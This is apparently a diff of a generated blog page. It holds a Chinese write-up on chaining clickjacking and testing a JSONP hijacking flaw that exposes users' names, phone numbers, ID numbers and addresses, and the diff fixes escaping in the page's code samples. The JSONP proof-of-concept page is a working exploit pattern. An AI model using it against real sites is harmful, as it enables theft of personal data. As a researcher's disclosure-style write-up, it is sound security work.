@@ -433,7 +433,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.7k
                 </div>
                 
 
@@ -500,29 +500,29 @@ Access-Control-Allow-Credentials: true
 <p>然后我再次思考，既然要用户点击，那是不是可以做一个点击劫持呢？而这个站也刚好有着点击劫持的漏洞。所以我调整了一下按钮的位置最后生成了一个可以利用的页面。</p>
 <p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1586448914515.png" alt=""></p>
 <p>那么问题再次出现，我要怎么把payload输进去，不可能让用户自己敲吧，所以我在想能不能用JavaScript给输入框提前赋默认值。先获取iframe的作为父页面，然后再获取父页面的输入框dom元素进行修改。</p>
-<pre class=" language-language-javascript"><code class="language-language-javascript"><script>
-	var childHtml = document.getElementById("frame").contentWindow;
-	var a = childHtml.document.getElementById("city").value='abc';
-</script>
-
-</p><p>但是在chrome的console界面我看到无法获取到value的值，那么问题就应该是无法加载iframe中id为city的dom元素，应该是同源策略的问题。</p>
+<pre><code>&lt;script&gt;
+	var childHtml = document.getElementById(&quot;frame&quot;).contentWindow;
+	var a = childHtml.document.getElementById(&quot;city&quot;).value='abc';
+&lt;/script&gt;
+</code></pre>
+<p>但是在chrome的console界面我看到无法获取到value的值，那么问题就应该是无法加载iframe中id为city的dom元素，应该是同源策略的问题。</p>
 <p>后来我又想了想能否利用JavaScript来复制我们的payload，但是越往后想，我感觉攻击的思路越过于理想化，遂放弃了这个domxss的攻击方法。</p>
 <p>重新回到返回敏感信息的接口，我想起了jsonp劫持，我好像还没有fuzz callback函数，结果是并不用fuzz，函数名就是callback。所以直接在本地构造好</p>
-<pre class=" language-language-html"><code class="language-language-html"><!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-<meta charset="utf-8">
-<title>JSONP劫持测试</title>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
-<body>
-<script>function jsonp2(data){alert(JSON.stringify(data));}</script>
-<script src="http://user.xxxx.com/webapi/contact/query/?callback=jsonp2"></script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
-</html>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;JSONP劫持测试&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;function jsonp2(data){alert(JSON.stringify(data));}&lt;/script&gt;
+&lt;script src=&quot;http://user.xxxx.com/webapi/contact/query/?callback=jsonp2&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1586450057604.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1586450057604.png" alt=""></p>
 <p>但是我又翻了看看，这个弹窗里为什么只有姓名手机号和生日，最重要的地址和身份证号没了呢？回过头去看了一下访问接口的请求包</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/053.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/053.png" alt=""></p>
 <p>发现要显示的信息是有参数设置的，而我们又知道jsonp是不能发起post请求的，那么就不能带上这几个参数，但是我又仔细想了想，如果后端设置的并不只是post接收，还可以get接收呢？</p>
 <p>修改了一下jsonp劫持的代码。</p>
 <pre><code>&lt;!DOCTYPE html&gt;
@@ -538,14 +538,14 @@ Access-Control-Allow-Credentials: true
 &lt;/html&gt;
 </code></pre>
 <p>再次访问</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/981.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/981.png" alt=""></p>
 <p>这一次，身份证和地址都出现了。</p>
 <h3 id="0x03-后记">0x03 后记</h3>
 <p>这次虽然没有按照预想打出鸡肋漏洞的组合拳，但是也在思考中收获了很多，最终的jsonp劫持没有什么技术含量，师傅们见笑了。</p>
 <p>参考文章：</p>
 <p><a href="https://gh0st.cn/archives/2017-12-20/1">https://gh0st.cn/archives/2017-12-20/1</a></p>
 <p><a href="https://xz.aliyun.com/t/6539">https://xz.aliyun.com/t/6539</a></p>
-<p></p>
+</script></p>
             </div>
             <hr>
 
